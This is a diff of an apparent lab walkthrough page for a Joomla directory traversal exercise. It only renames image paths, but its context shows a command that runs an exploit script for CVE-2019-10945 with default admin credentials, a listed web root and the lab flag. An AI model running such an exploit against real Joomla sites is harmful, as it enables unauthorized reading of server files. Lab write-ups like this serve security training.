@@ -93,7 +93,7 @@ web.config.txt
 
 Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application
 
-<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption><p>3.9.4</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (32) (2).png" alt=""><figcaption><p>3.9.4</p></figcaption></figure>
 
 ```
 python3 CVE-2019-10945.py --url=http://dev.inlanefreight.local/administrator --username=admin --password=admin --dir=/                                   
@@ -137,4 +137,4 @@ robots.txt
 web.config.txt
 ```
 
-<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption><p>j00mla_c0re_d1rtrav3rsal!</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35) (2).png" alt=""><figcaption><p>j00mla_c0re_d1rtrav3rsal!</p></figcaption></figure>
